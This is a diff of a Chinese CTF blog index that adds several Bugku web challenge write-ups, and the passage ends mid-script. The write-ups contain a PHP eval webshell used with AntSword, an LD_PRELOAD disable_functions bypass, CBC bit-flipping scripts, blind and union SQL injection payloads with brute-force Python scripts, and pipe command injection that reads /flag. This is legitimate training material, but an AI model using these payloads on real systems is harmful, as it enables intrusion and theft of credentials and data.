+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f &#x3D; trim(file_get_contents($fn));</span><br><span class="line">if ($ac &#x3D;&#x3D;&#x3D; $f)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;sorry!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>file_get_contents</code>是把文件读取成字符串</p>
+<p>所以用<code>php://input</code></p>
+<p>传入<code>?fn=php://input&amp;ac=1</code><br>然后post传入<code>1</code><br>得到flag</p>
+<img src="/2021/08/12/bugku-web-file-get-contents/1.PNG" class="" title="1.PNG">
       
 
       
@@ -405,7 +418,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/08/xman2021-easyssti/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/12/bugku-web-file-get-contents/">展开全文 >></a>
         </p>
       
 
@@ -457,14 +470,14 @@
     </section>
   
   
-    <article id="post-buu-ezrce" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-getshell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/04/buu-ezrce/">buu-ezrce</a>
+      <a class="article-title" href="/2021/08/11/bugku-web-getshell/">bugku-web-getshell</a>
     </h1>
   
 
@@ -472,19 +485,32 @@
         
 
 
-<a href="/2021/08/04/buu-ezrce/" class="archive-article-date">
-  	<time datetime="2021-08-04T03:37:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
+<a href="/2021/08/11/bugku-web-getshell/" class="archive-article-date">
+  	<time datetime="2021-08-11T13:48:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开后发现是yipi界面，直接搜“yipi漏洞”<br>前面的步骤按照这篇来就行——<a target="_blank" rel="noopener" href="https://blog.csdn.net/Trouble_99/article/details/118667625">https://blog.csdn.net/Trouble_99/article/details/118667625</a><br>最后改代码中ls为<br>ls ..;<br>ls ../..;<br>找到ffffffflllllaggggg<br>cat ../../ffffffflllllaggggg就行</p>
-<img src="/2021/08/04/buu-ezrce/1.PNG" class="" title="1.PNG">
-<img src="/2021/08/04/buu-ezrce/2.PNG" class="" title="2.PNG">
-<img src="/2021/08/04/buu-ezrce/3.PNG" class="" title="3.PNG">
-<img src="/2021/08/04/buu-ezrce/4.PNG" class="" title="4.PNG">
+        <img src="/2021/08/11/bugku-web-getshell/1.PNG" class="" title="1.PNG">
+<p>这个题其实就是一点一点静下心来对照着读代码，做替换，就会发现其实是用同一个替换方法对源码替换了两次，才成为现在这个样子</p>
+<p>解出来后的源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">@eval($_POST[ymlisisisiook]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>上蚁剑，连木马</p>
+<img src="/2021/08/11/bugku-web-getshell/2.PNG" class="" title="2.PNG">
+
+<p>但是发现没有向上查看的权限<br>利用蚁剑插件（“加载插件”–“辅助工具”–”绕过disable_functions”）发现putenv没有被禁用</p>
+<img src="/2021/08/11/bugku-web-getshell/3.PNG" class="" title="3.PNG">
+
+<p>“选择模式”–“LD_PRELOAD”，执行成功</p>
+<img src="/2021/08/11/bugku-web-getshell/4.PNG" class="" title="4.PNG">
+
+<p>访问生成的文件（<code>http://114.67.246.176:14071/.antproxy.php</code>），连接成功</p>
+<img src="/2021/08/11/bugku-web-getshell/5.PNG" class="" title="5.PNG">
+
+<p>拿到flag</p>
+<img src="/2021/08/11/bugku-web-getshell/6.PNG" class="" title="6.PNG">
       
 
       
@@ -496,7 +522,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/04/buu-ezrce/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/11/bugku-web-getshell/">展开全文 >></a>
         </p>
       
 
@@ -548,14 +574,14 @@
     </section>
   
   
-    <article id="post-buu-easythinkphp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-CBC" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/04/buu-easythinkphp/">buu-easythinkphp</a>
+      <a class="article-title" href="/2021/08/11/bugku-web-CBC/">bugku-web-CBC</a>
     </h1>
   
 
@@ -563,15 +589,29 @@
         
 
 
-<a href="/2021/08/04/buu-easythinkphp/" class="archive-article-date">
-  	<time datetime="2021-08-04T02:08:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
+<a href="/2021/08/11/bugku-web-CBC/" class="archive-article-date">
+  	<time datetime="2021-08-11T09:18:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p>按流程：随便输——&gt;提示admin——&gt;输admin——&gt;发现不行</p>
+<img src="/2021/08/11/bugku-web-CBC/1.PNG" class="" title="1.PNG">
+<img src="/2021/08/11/bugku-web-CBC/2.PNG" class="" title="2.PNG">
+
+<p>扫目录，发现swp备份文件<br>用linux打开（<code>vim -r .index.php.swp</code>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, file_get_contents(&#39;&#x2F;root&#x2F;key&#39;));</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_iv()&#123;	&#x2F;&#x2F;随机生成16位初始化向量</span><br><span class="line">    $random_iv&#x3D;&#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.&#x3D;chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#第一个执行的方法</span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv &#x3D; get_random_iv();</span><br><span class="line">    $plain &#x3D; serialize($info);	&#x2F;&#x2F;明文序列化</span><br><span class="line">    $cipher &#x3D; openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);	&#x2F;&#x2F;加密</span><br><span class="line">	&#x2F;&#x2F;options：以下标记的按位或： OPENSSL_RAW_DATA 原生数据，对应数字1，不进行 base64 编码。OPENSSL_ZERO_PADDING 数据进行 base64 编码再返回，对应数字0。 </span><br><span class="line">    $_SESSION[&#39;username&#39;] &#x3D; $info[&#39;username&#39;];	&#x2F;&#x2F;注册SESSION全局变量</span><br><span class="line">	&#x2F;&#x2F;以下两行设置cookie</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;]))&#123;</span><br><span class="line">        $cipher &#x3D; base64_decode($_COOKIE[&#39;cipher&#39;]);</span><br><span class="line">        $iv &#x3D; base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain &#x3D; openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info &#x3D; unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">            $_SESSION[&#39;username&#39;] &#x3D; $info[&#39;username&#39;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#第二个执行，检测用户名为admin时，打印flag</span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]&#x3D;&#x3D;&#x3D;&#39;admin&#39;)&#123;</span><br><span class="line">        echo &#39;&lt;p&gt;Hello admin&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">        echo &#39;&lt;p&gt;Flag is $flag&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">        echo &#39;&lt;p&gt;Only admin can see flag&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#39;&lt;p&gt;&lt;a href&#x3D;&quot;loginout.php&quot;&gt;Log out&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]))&#123;</span><br><span class="line">    $username &#x3D; (string)$_POST[&#39;username&#39;];</span><br><span class="line">    $password &#x3D; (string)$_POST[&#39;password&#39;];</span><br><span class="line">    if($username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;</span><br><span class="line">        exit(&#39;&lt;p&gt;admin are not allowed to login&lt;&#x2F;p&gt;&#39;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info &#x3D; array(&#39;username&#39;&#x3D;&gt;$username,&#39;password&#39;&#x3D;&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#39;&lt;body class&#x3D;&quot;login-body&quot;&gt;</span><br><span class="line">                &lt;div id&#x3D;&quot;wrapper&quot;&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;user-icon&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;pass-icon&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                    &lt;form name&#x3D;&quot;login-form&quot; class&#x3D;&quot;login-form&quot; action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;&#x2F;h1&gt;</span><br><span class="line">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;&#x2F;span&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name&#x3D;&quot;username&quot; type&#x3D;&quot;text&quot; class&#x3D;&quot;input username&quot; value&#x3D;&quot;Username&quot; onfocus&#x3D;&quot;this.value&#x3D;\&#39;\&#39;&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; class&#x3D;&quot;input password&quot; value&#x3D;&quot;Password&quot; onfocus&#x3D;&quot;this.value&#x3D;\&#39;\&#39;&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后代码审计：<br>真做不出来，主要参考的这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/u013577244/article/details/86310881">https://blog.csdn.net/u013577244/article/details/86310881</a></p>
+<p>解题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">	#计算cipher</span><br><span class="line">	&#x2F;*</span><br><span class="line">	明文1：a:2:&#123;s:8:&quot;userna		&#x2F;&#x2F;r</span><br><span class="line">	明文2：me&quot;;s:5:&quot;admil&quot;;		&#x2F;&#x2F;l字母在第14个字节</span><br><span class="line">	明文3：s:8:&quot;password&quot;;s</span><br><span class="line">	明文4：:3:&quot;123&quot;;&#125;</span><br><span class="line">	*&#x2F;</span><br><span class="line">	$cipher &#x3D; base64_decode(urldecode(&#39;f0csYAAWDy%2FGlSsvWLr6NlCBad4p2U%2BXm2Rr2X07iytKd4r8V5tbO7%2FcxIib96eRDGUOMQclQgvxw2SZXOobWQ%3D%3D&#39;));</span><br><span class="line">	$temp &#x3D; $cipher;</span><br><span class="line">	&#x2F;*</span><br><span class="line">	设密文1[13]&#x3D;A,	解密(密文2)[13]&#x3D;B,	明文2[13]&#x3D;C,	</span><br><span class="line">	将A修改为A ^ C,则:</span><br><span class="line">	A ^ B &#x3D; A ^ C ^ B &#x3D; B ^ B &#x3D; 0 &#x3D; C</span><br><span class="line">	*&#x2F;</span><br><span class="line">	&#x2F;&#x2F;						A				  C			 X</span><br><span class="line">	$cipher[13] &#x3D; chr(ord($cipher[13]) ^ ord(&#39;l&#39;) ^ ord(&#39;n&#39;));</span><br><span class="line">	echo urlencode(base64_encode($cipher));</span><br><span class="line">	?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	#计算iv</span><br><span class="line">	$res &#x3D; base64_decode(&#39;yeiydaYLG5RNzOPWaQgOkG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ&#x3D;&#x3D;&#39;);	&#x2F;&#x2F;这里放burp放回的base64数据</span><br><span class="line">	$iv &#x3D; base64_decode(urldecode(&#39;TD9FI%2FvbrZn%2FSjbSD9bfSQ%3D%3D&#39;)); &#x2F;&#x2F;这里放cookie中的iv</span><br><span class="line">	$plaintext &#x3D; &#39;a:2:&#123;s:8:&quot;userna&#39;;</span><br><span class="line">	$new_iv &#x3D; &#39;&#39;;</span><br><span class="line">	for ($i &#x3D; 0; $i &lt; 16; $i ++)&#123;</span><br><span class="line">		$new_iv &#x3D; $new_iv . chr(ord($iv[$i]) ^ ord($res[$i]) ^ ord($plaintext[$i]));</span><br><span class="line">	&#125;</span><br><span class="line">	echo urlencode(base64_encode($new_iv));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<img src="/2021/08/11/bugku-web-CBC/5.PNG" class="" title="5.PNG">
+<img src="/2021/08/11/bugku-web-CBC/6.PNG" class="" title="6.PNG">
       
 
       
@@ -583,7 +623,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/04/buu-easythinkphp/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/11/bugku-web-CBC/">展开全文 >></a>
         </p>
       
 
@@ -635,14 +675,14 @@
     </section>
   
   
-    <article id="post-buu-easyweb" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-sql注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/04/buu-easyweb/">buu-easyweb</a>
+      <a class="article-title" href="/2021/08/11/bugku-web-sql%E6%B3%A8%E5%85%A5/">bugku-web-sql注入</a>
     </h1>
   
 
@@ -650,15 +690,21 @@
         
 
 
-<a href="/2021/08/04/buu-easyweb/" class="archive-article-date">
-  	<time datetime="2021-08-04T01:12:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
+<a href="/2021/08/11/bugku-web-sql%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2021-08-11T09:12:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p>方法和<a href="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/" title="都过滤了（web36）">都过滤了（web36）</a>差不多</p>
+<p>这次用<code>username=admin&#39;^(ascii(mid((password)from(§1§)))&lt;&gt;ascii(&#39;§4§&#39;))#&amp;password=123</code>在bp上爆破，网站一如既往的容易挂</p>
+<p>上脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!-*-coding:utf-8-*-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;114.67.246.176:16405&#x2F;index.php&quot;</span><br><span class="line"></span><br><span class="line">password &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    for j in &#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line"></span><br><span class="line">        #print(i);</span><br><span class="line"></span><br><span class="line">        payload &#x3D; &quot;admin&#39;^(ascii(mid((password)from(&quot; + str(i) + &quot;)))&lt;&gt;ascii(&#39;&quot; + j + &quot;&#39;))#&quot;</span><br><span class="line">        #print(payload)</span><br><span class="line"></span><br><span class="line">        #print(j)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">        &#39;username&#39;: payload,</span><br><span class="line">        &#39;password&#39;: &#39;123&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line">        #print(r.content)</span><br><span class="line"></span><br><span class="line">        #print(r.text)</span><br><span class="line"></span><br><span class="line">        if &quot;&lt;p align&#x3D;&#39;center&#39;&gt;password error!&lt;&#x2F;p&gt;&quot; in r.text:</span><br><span class="line">            password +&#x3D; j</span><br><span class="line">            print(password)</span><br><span class="line">            break</span><br><span class="line">print(&quot;密码是&quot;+password)</span><br></pre></td></tr></table></figure>
+
+<p>md5解出来还是<code>bugkuctf</code>，直接拿flag</p>
+<img src="/2021/08/11/bugku-web-sql%E6%B3%A8%E5%85%A5/1.PNG" class="" title="1.PNG">
       
 
       
@@ -670,7 +716,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/04/buu-easyweb/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/11/bugku-web-sql%E6%B3%A8%E5%85%A5/">展开全文 >></a>
         </p>
       
 
@@ -722,14 +768,14 @@
     </section>
   
   
-    <article id="post-视频推荐" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-login2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/02/%E8%A7%86%E9%A2%91%E6%8E%A8%E8%8D%90/">视频推荐</a>
+      <a class="article-title" href="/2021/08/11/bugku-web-login2/">bugku-web-login2</a>
     </h1>
   
 
@@ -737,16 +783,31 @@
         
 
 
-<a href="/2021/08/02/%E8%A7%86%E9%A2%91%E6%8E%A8%E8%8D%90/" class="archive-article-date">
-  	<time datetime="2021-08-02T13:10:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-02</time>
+<a href="/2021/08/11/bugku-web-login2/" class="archive-article-date">
+  	<time datetime="2021-08-11T06:43:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>docker（对我来说语速最舒服，普通话最好的老师之一，不背稿现场发挥的良心老师，但是有打鸡血嫌疑，前一部分适当跳过吧，但是那也比机构老师拖时间舒服多了）：<br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1og4y1q7M4?from=search&amp;seid=15506386515153261111">https://www.bilibili.com/video/BV1og4y1q7M4?from=search&amp;seid=15506386515153261111</a></p>
-<p>服务器购买：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV177411K7bH">https://www.bilibili.com/video/BV177411K7bH</a><br>云翼计划：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/plan/grow-up">https://developer.aliyun.com/plan/grow-up</a><br>免费试用：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/adc/student/?spm=5176.10695662.3291411370.2.b3115a060G0pWR">https://developer.aliyun.com/adc/student/?spm=5176.10695662.3291411370.2.b3115a060G0pWR</a></p>
+        <p>sqlmap扫目录可以注入，但是内容为空<br>所以不存在猜密码的选项了</p>
+<img src="/2021/08/11/bugku-web-login2/1.PNG" class="" title="1.PNG">
+<p>用repeater发送后看到有个tip 是一串base64加密的字符，解密后明文：</p>
+<img src="/2021/08/11/bugku-web-login2/2.PNG" class="" title="2.PNG">
+
+<p>审计后发现可以构造一个不存在的用户进行登录，查询的密码要和md5加密后的一致，构造payload：<br>username=admin’ union select 1,md5(123)#&amp;password=123</p>
+<p>进入shell界面</p>
+<img src="/2021/08/11/bugku-web-login2/4.PNG" class="" title="4.PNG">
+<img src="/2021/08/11/bugku-web-login2/5.PNG" class="" title="5.PNG">
+
+<p>用<code>|</code>绕过<br>传入<code>123|ls</code>没有回显<br>采用写入文件二次返回的方法查看结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123|ls ..&#x2F;..&#x2F;..&#x2F;&gt;test</span><br></pre></td></tr></table></figure>
+<p>然后访问<a target="_blank" rel="noopener" href="http://114.67.246.176:13110/test">http://114.67.246.176:13110/test</a></p>
+<img src="/2021/08/11/bugku-web-login2/6.PNG" class="" title="6.PNG">
+
+<p>cat出flag<br><code>123|cat /flag&gt;test</code></p>
+<img src="/2021/08/11/bugku-web-login2/7.PNG" class="" title="7.PNG">
 
       
 
@@ -759,7 +820,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/02/%E8%A7%86%E9%A2%91%E6%8E%A8%E8%8D%90/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/11/bugku-web-login2/">展开全文 >></a>
         </p>
       
 
@@ -811,14 +872,14 @@
     </section>
   
   
-    <article id="post-工具网站" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-bugku-web-都过滤了" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/01/%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/">工具网站</a>
+      <a class="article-title" href="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/">bugku-web-都过滤了</a>
     </h1>
   
 
@@ -826,17 +887,25 @@
         
 
 
-<a href="/2021/08/01/%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/" class="archive-article-date">
-  	<time datetime="2021-08-01T15:17:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-01</time>
+<a href="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/" class="archive-article-date">
+  	<time datetime="2021-08-11T05:33:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>CTF在线工具箱：<a target="_blank" rel="noopener" href="http://ctf.ssleye.com/">http://ctf.ssleye.com/</a><br>包含CTF比赛中常用的编码、加解密、算法。</p>
-<p>CTF加解密工具箱：<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Category.php?Id=27">http://www.atoolbox.net/Category.php?Id=27</a></p>
-<p>ctfhub在线工具：<a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/tools">https://www.ctfhub.com/#/tools</a></p>
+        <p>这道题本来有个DS_Store源码泄露漏洞，不过后来被修了</p>
+<p>现在只能通过sql注入</p>
+<p>另外，如果这道题你手注爆破的思路没有问题，但是怎么都爆破不出来……不要怀疑自己，就是平台的锅，因为这玩意动不动就挂掉，根本就爆破不出来</p>
+<p>看提示没有过滤<code>^</code>和<code>-</code>，可以用异或注入</p>
+<p>可以自己传<code>admin&#39;-(ascii(mid((passwd)from(&quot; + str(i) + &quot;)))=&quot; + str(ord(j)) + &quot;)-&#39;</code>改变j的值测试一下，会发现只有一个的回显是<code>username error</code>,其余都是<code>password error</code></p>
+<p>然后跑脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!-*-coding:utf-8-*-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;114.67.246.176:15484&#x2F;login.php&quot;</span><br><span class="line"></span><br><span class="line">password 